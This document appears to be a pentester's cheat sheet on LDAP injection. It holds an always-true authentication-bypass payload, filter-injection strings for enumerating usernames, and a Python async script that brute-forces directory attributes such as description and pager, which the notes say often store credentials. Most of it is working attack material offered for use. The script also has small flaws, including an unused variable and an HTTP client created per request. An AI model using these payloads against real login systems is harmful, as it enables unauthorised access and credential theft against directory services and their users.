# LDAP Injection

## Basic Injection

```
# Auth bypass via always-true filter:
username=*)(uid=*))(|(uid=*
password=anything

# Equivalent filter: (&(uid=*)(uid=*))(|(uid=*)(password=anything))
```

## Blind Attribute Brute-Force (Wildcard Injection)

When the app returns different responses for valid/invalid LDAP queries, enumerate usernames then attribute values using wildcard suffixes.

### Python async brute-force (httpx)

```python
import asyncio, httpx, string

TARGET = "http://<TARGET>/login"
CHARSET = string.ascii_lowercase + string.digits + "-_."

async def check(client, prefix):
    # Inject: &(sAMAccountName=*)(description=<prefix>*)  → bypasses normal filter
    r = await client.post(TARGET, data={
        "username": f"*)(sAMAccountName=*)(&(sAMAccountName=*)(description={prefix}*",
        "password": "anything"
    })
    return r.status_code == 200 or "Welcome" in r.text  # adjust to success indicator

async def brute(field_prefix=""):
    found = field_prefix
    while True:
        tasks = {c: check for c in CHARSET}
        results = await asyncio.gather(*[check(httpx.AsyncClient(), found + c) for c in CHARSET])
        hit = None
        for c, ok in zip(CHARSET, results):
            if ok:
                hit = c
                break
        if hit is None:
            break
        found += hit
        print(f"[+] {found}")
    return found

asyncio.run(brute())
```

### Manual filter structure

```
# Enumerate usernames: inject )(sAMAccountName=<prefix>*)(|(uid=x
# Target filter becomes: (&(uid=)(sAMAccountName=<prefix>*)(|(uid=x)(pass=...))
```

## Notes

- Attributes to brute: `description`, `info`, `telephoneNumber`, `pager` (often used to store creds)
- Use `*` alone to confirm the field exists before brute-forcing
- Async HTTP (httpx/aiohttp) makes blind brute-force feasible (~26^n requests at high concurrency)
